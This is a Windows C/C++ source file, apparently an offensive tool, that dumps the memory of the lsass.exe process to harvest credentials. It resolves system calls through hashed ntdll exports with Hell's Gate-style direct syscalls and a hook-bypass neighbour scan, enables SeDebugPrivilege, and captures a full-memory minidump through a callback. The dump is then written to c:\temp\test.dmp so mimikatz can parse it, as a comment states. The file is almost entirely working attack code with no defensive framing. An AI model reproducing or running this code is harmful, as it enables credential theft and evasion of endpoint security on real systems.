// cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /TcC:\Users\Raul\GitClones\encrypt\test-encrypted.cpp /link /OUT:C:\Users\Raul\GitClones\encrypt\test-encrypted.exe /SUBSYSTEM:CONSOLE /MACHINE:x64
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <DbgHelp.h>
#include <string.h>
#include <TlHelp32.h>
#include <ProcessSnapshot.h>
#include "structs.h"
#pragma comment (lib, "Dbghelp.lib")

#define UP -32
#define DOWN 32

// External asm function prototype
extern "C" VOID HellsGate(WORD wSystemCall);

extern "C" NTSTATUS SysNtOpenProcess(PHANDLE ProcessHandle, ACCESS_MASK AccessMask, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId);

extern "C" NTSTATUS SysNtOpenProcessToken(HANDLE ProcessHandle, ACCESS_MASK DesiredAccess, PHANDLE TokenHandle);

extern "C" NTSTATUS SysNtClose(HANDLE Handle);

extern "C" NTSTATUS SysNtCreateFile(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength);

extern "C" NTSTATUS SysNtWriteFile(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE  ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID Buffer, ULONG Length, PLARGE_INTEGER ByteOffset, PULONG Key);

typedef void (NTAPI* xxRtlInitUnicodeString)(PUNICODE_STRING, PCWSTR);

//extern "C" NTSTATUS SysNtCreateFile()

// Buffer for saving the minidump
LPVOID dumpBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 1024 * 75);
DWORD bytesRead = 0;


//Function prototypes
BOOL GetImageExportDirectory(
	_In_ PVOID                     pModuleBase,
	_Out_ PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory
);
BOOL GetVxTableEntry(
	_In_ PVOID pModuleBase,
	_In_ PIMAGE_EXPORT_DIRECTORY pImageExportDirectory,
	_In_ PVX_TABLE_ENTRY pVxTableEntry
);
BOOL Payload(
	_In_ PVX_TABLE pVxTable
);
PTEB RtlGetThreadEnvironmentBlock();

BOOL CALLBACK minidumpCallback(
	__in     PVOID callbackParam,
	__in     const PMINIDUMP_CALLBACK_INPUT callbackInput,
	__inout  PMINIDUMP_CALLBACK_OUTPUT callbackOutput
)
{
	LPVOID destination = 0, source = 0;
	DWORD bufferSize = 0;

	switch (callbackInput->CallbackType)
	{
	case IoStartCallback:
		callbackOutput->Status = S_FALSE;
		break;

		// Gets called for each lsass process memory read operation
	case IoWriteAllCallback:
		callbackOutput->Status = S_OK;

		// A chunk of minidump data that's been jus read from lsass. 
		// This is the data that would eventually end up in the .dmp file on the disk, but we now have access to it in memory, so we can do whatever we want with it.
		// We will simply save it to dumpBuffer.
		source = callbackInput->Io.Buffer;

		// Calculate location of where we want to store this part of the dump.
		// Destination is start of our dumpBuffer + the offset of the minidump data
		destination = (LPVOID)((DWORD_PTR)dumpBuffer + (DWORD_PTR)callbackInput->Io.Offset);

		// Size of the chunk of minidump that's just been read.
		bufferSize = callbackInput->Io.BufferBytes;
		bytesRead += bufferSize;

		RtlCopyMemory(destination, source, bufferSize);

		printf("[+] Minidump offset: 0x%x; length: 0x%x\n", callbackInput->Io.Offset, bufferSize);
		break;

	case IoFinishCallback:
		callbackOutput->Status = S_OK;
		break;

	default:
		return true;
	}
	return TRUE;
}

BOOL AddSeDebugPrivileges(PVX_TABLE pVxTable) {
	// Get the current process handle
	NTSTATUS status;
	DWORD dwPid = GetCurrentProcessId();
	HANDLE pHandle = NULL;
	CLIENT_ID cid;
	cid.UniqueProcess = (PVOID)dwPid;
	cid.UniqueThread = NULL;
	OBJECT_ATTRIBUTES oa;
	InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
	HellsGate(pVxTable->NtOpenProcess.wSystemCall);
	status = SysNtOpenProcess(&pHandle, PROCESS_QUERY_INFORMATION, &oa, &cid);
	

	// Get the token handle with query information and adjust privileges access
	HANDLE hTok = INVALID_HANDLE_VALUE;
	HellsGate(pVxTable->NtOpenProcessToken.wSystemCall);
	status = SysNtOpenProcessToken(pHandle, TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hTok);

	if (hTok != INVALID_HANDLE_VALUE) {
		printf("token handle obtained");
	}

	// Get the value of SeDebugPrivilege from text
	LUID pDebugPriv;
	if (!LookupPrivilegeValueA(nullptr, "SeDebugPrivilege", &pDebugPriv)) {
		printf("LookupPrivilegeValueA()");
		return FALSE;
	}

	// Adjust token privilege 
	TOKEN_PRIVILEGES tokPrivs;
	tokPrivs.PrivilegeCount = 1;
	tokPrivs.Privileges[0].Luid = pDebugPriv;
	tokPrivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if (!AdjustTokenPrivileges(hTok, FALSE, &tokPrivs, NULL, nullptr, nullptr)) {
		printf("AdjustTokenPrivileges()");
		return FALSE;
	}

	// Query token privileges to confirm whether 
	BOOL bRes;
	PRIVILEGE_SET tokPrivSet;
	tokPrivSet.Control = PRIVILEGE_SET_ALL_NECESSARY;
	tokPrivSet.PrivilegeCount = 1;
	tokPrivSet.Privilege[0].Luid = pDebugPriv;
	if (!PrivilegeCheck(hTok, &tokPrivSet, &bRes)) {
		printf("PrivilegeCheck()");
		return FALSE;
	}
	HellsGate(pVxTable->NtClose.wSystemCall);
	SysNtClose(pHandle);
	SysNtClose(hTok);
	pHandle = nullptr;
	hTok = nullptr;
	getchar();
	return bRes;
}

int FindTarget(const WCHAR* procname) {

	HANDLE hProcSnap;
	PROCESSENTRY32 pe32;
	int pid = 0;

	hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == hProcSnap) return 0;

	pe32.dwSize = sizeof(PROCESSENTRY32);

	if (!Process32First(hProcSnap, &pe32)) {
		CloseHandle(hProcSnap);
		return 0;
	}

	while (Process32Next(hProcSnap, &pe32)) {
		if (lstrcmpiW(procname, pe32.szExeFile) == 0) {
			pid = pe32.th32ProcessID;
			break;
		}
	}

	CloseHandle(hProcSnap);

	return pid;
}

PTEB RtlGetThreadEnvironmentBlock() {
#if _WIN64
	return (PTEB)__readgsqword(0x30);
#else
	return (PTEB)__readfsdword(0x16);
#endif
}

DWORD64 djb2(PBYTE str) {
	DWORD64 dwHash = 0x7734773477347734;
	INT c;

	while (c = *str++)
		dwHash = ((dwHash << 0x5) + dwHash) + c;

	return dwHash;
}

BOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory) {
	// Get DOS header
	PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)pModuleBase;
	if (pImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
		return FALSE;
	}

	// Get NT headers
	PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pImageDosHeader->e_lfanew);
	if (pImageNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
		return FALSE;
	}

	// Get the EAT
	*ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
	return TRUE;
}

BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pVxTableEntry) {
	PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfFunctions);
	PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNames);
	PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNameOrdinals);

	for (WORD cx = 0; cx < pImageExportDirectory->NumberOfNames; cx++) {
		PCHAR pczFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[cx]);
		PVOID pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];

		if (djb2((PBYTE)pczFunctionName) == pVxTableEntry->dwHash) {
			pVxTableEntry->pAddress = pFunctionAddress;

			// First opcodes should be :
			//    MOV R10, RCX
			//    MOV RAX, <syscall>
			if (*((PBYTE)pFunctionAddress) == 0x4c
				&& *((PBYTE)pFunctionAddress + 1) == 0x8b
				&& *((PBYTE)pFunctionAddress + 2) == 0xd1
				&& *((PBYTE)pFunctionAddress + 3) == 0xb8
				&& *((PBYTE)pFunctionAddress + 6) == 0x00
				&& *((PBYTE)pFunctionAddress + 7) == 0x00) {

				BYTE high = *((PBYTE)pFunctionAddress + 5);
				BYTE low = *((PBYTE)pFunctionAddress + 4);
				pVxTableEntry->wSystemCall = (high << 8) | low;

				return TRUE;
			}

			// if hooked check the neighborhood to find clean syscall
			if (*((PBYTE)pFunctionAddress) == 0xe9) {

				for (WORD idx = 1; idx <= 500; idx++) {
					// check neighboring syscall down
					if (*((PBYTE)pFunctionAddress + idx * DOWN) == 0x4c
						&& *((PBYTE)pFunctionAddress + 1 + idx * DOWN) == 0x8b
						&& *((PBYTE)pFunctionAddress + 2 + idx * DOWN) == 0xd1
						&& *((PBYTE)pFunctionAddress + 3 + idx * DOWN) == 0xb8
						&& *((PBYTE)pFunctionAddress + 6 + idx * DOWN) == 0x00
						&& *((PBYTE)pFunctionAddress + 7 + idx * DOWN) == 0x00) {
						BYTE high = *((PBYTE)pFunctionAddress + 5 + idx * DOWN);
						BYTE low = *((PBYTE)pFunctionAddress + 4 + idx * DOWN);
						pVxTableEntry->wSystemCall = (high << 8) | low - idx;


						return TRUE;
					}
					// check neighboring syscall up
					if (*((PBYTE)pFunctionAddress + idx * UP) == 0x4c
						&& *((PBYTE)pFunctionAddress + 1 + idx * UP) == 0x8b
						&& *((PBYTE)pFunctionAddress + 2 + idx * UP) == 0xd1
						&& *((PBYTE)pFunctionAddress + 3 + idx * UP) == 0xb8
						&& *((PBYTE)pFunctionAddress + 6 + idx * UP) == 0x00
						&& *((PBYTE)pFunctionAddress + 7 + idx * UP) == 0x00) {
						BYTE high = *((PBYTE)pFunctionAddress + 5 + idx * UP);
						BYTE low = *((PBYTE)pFunctionAddress + 4 + idx * UP);
						pVxTableEntry->wSystemCall = (high << 8) | low + idx;

						return TRUE;
					}

				}

				return FALSE;
			}
		}
	}

	return TRUE;
}

BOOL Payload(PVX_TABLE pVxTable) {
	NTSTATUS status = 0x00000000;

	DWORD bytesWritten = 0;
	
	//HANDLE outFile = CreateFile(L"c:\\temp\\dump.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	//printf("vx_tab: %p | HellsGate: %p | HellDescent: %p\n", pVxTable, HellsGate); getchar();
	DWORD pid = 0;
	pid = FindTarget(L"lsass.exe");
	HANDLE pHandle = NULL;
	CLIENT_ID cid;
	cid.UniqueProcess = (PVOID)pid;
	cid.UniqueThread = NULL;
	OBJECT_ATTRIBUTES oa;
	InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);

	BOOL bRes = TRUE;
	bRes = AddSeDebugPrivileges(pVxTable);
	if (bRes == FALSE) {
		printf("Couldn't enable SeDebug privs!\n");
	}
	HellsGate(pVxTable->NtOpenProcess.wSystemCall);
	status = SysNtOpenProcess(&pHandle, PROCESS_ALL_ACCESS, &oa, &cid);

	if (pHandle == NULL)
	{
		printf("Handle not obtained with syscall!\n");
	}
	else
	{
		printf("Handle obtained with syscall!\n"); 
	}


	HANDLE snapshotHandle = NULL;
	DWORD flags = (DWORD)PSS_CAPTURE_VA_CLONE | PSS_CAPTURE_HANDLES | PSS_CAPTURE_HANDLE_NAME_INFORMATION | PSS_CAPTURE_HANDLE_BASIC_INFORMATION | PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION | PSS_CAPTURE_HANDLE_TRACE | PSS_CAPTURE_THREADS | PSS_CAPTURE_THREAD_CONTEXT | PSS_CAPTURE_THREAD_CONTEXT_EXTENDED | PSS_CREATE_BREAKAWAY | PSS_CREATE_BREAKAWAY_OPTIONAL | PSS_CREATE_USE_VM_ALLOCATIONS | PSS_CREATE_RELEASE_SECTION;

	// Set up minidump callback
	MINIDUMP_CALLBACK_INFORMATION callbackInfo;
	ZeroMemory(&callbackInfo, sizeof(MINIDUMP_CALLBACK_INFORMATION));
	callbackInfo.CallbackRoutine = &minidumpCallback;
	callbackInfo.CallbackParam = NULL;

	//PssCaptureSnapshot(pHandle, (PSS_CAPTURE_FLAGS)flags, CONTEXT_ALL, (HPSS*)&snapshotHandle);

	// Create minidump
	BOOL isDumped = MiniDumpWriteDump(pHandle, pid, NULL, MiniDumpWithFullMemory, NULL, NULL, &callbackInfo);

	if (isDumped == TRUE) {
		printf("\n[+] lsass dumped to memory 0x%p\n", dumpBuffer);

		OBJECT_ATTRIBUTES oafile;
		HANDLE hFile = NULL;
		UNICODE_STRING fileName;
		IO_STATUS_BLOCK iosb;

		xxRtlInitUnicodeString RtlInitUnicodeString;
		RtlInitUnicodeString = (xxRtlInitUnicodeString)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlInitUnicodeString");

		RtlInitUnicodeString(&fileName, (PCWSTR)L"\\??\\c:\\temp\\test.dmp");
		ZeroMemory(&iosb, sizeof(IO_STATUS_BLOCK));
		InitializeObjectAttributes(&oafile, &fileName, OBJ_CASE_INSENSITIVE, NULL, NULL);
		HellsGate(pVxTable->NtCreateFile.wSystemCall);
		status = SysNtCreateFile(&hFile, FILE_GENERIC_WRITE, &oafile, &iosb, 0, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_WRITE, FILE_OVERWRITE_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
		// For testing purposes, let's write lsass dump to disk from our own dumpBuffer and check if mimikatz can work it
		BOOL bRes = WriteFile(hFile, dumpBuffer, bytesRead, &bytesWritten, NULL);
		//HellsGate(pVxTable->NtWriteFile.wSystemCall);
		//status = SysNtWriteFile(hFile, NULL, NULL, NULL, &iosb, dumpBuffer, (ULONG)sizeof(dumpBuffer), NULL, NULL);
		if (bRes == TRUE)
		{
			printf("\n[+] lsass dumped from 0x%p to c:\\temp\\test.dmp\n", dumpBuffer, bytesWritten);
		}
	}
	//PssFreeSnapshot(GetCurrentProcess(), (HPSS)snapshotHandle);

	return TRUE;
}

int main(void) {
	PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
	PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
	if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb->OSMajorVersion != 0xA)
		return 0x1;

	// Get NTDLL module 
	PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10);

	// Get the EAT of NTDLL
	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
	if (!GetImageExportDirectory(pLdrDataEntry->DllBase, &pImageExportDirectory) || pImageExportDirectory == NULL)
		return 0x01;

	VX_TABLE Table = { 0 };

	Table.NtOpenProcess.dwHash = 0x718cca1f5291f6e7;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtOpenProcess))
		return 0x1;
	Table.NtOpenProcessToken.dwHash = 0xc42b90fe8b421c48;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtOpenProcessToken))
		return 0x1;
	Table.NtClose.dwHash = 0xae30af6f3d64a8c;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtClose))
		return 0x1;
	Table.NtCreateFile.dwHash = 0xe4672568eef00d8a;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtCreateFile))
		return 0x1;
	Table.NtWriteFile.dwHash = 0x8accec2d0bb46d81;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtWriteFile))
		return 0x1;

	Payload(&Table);
    return 0;
}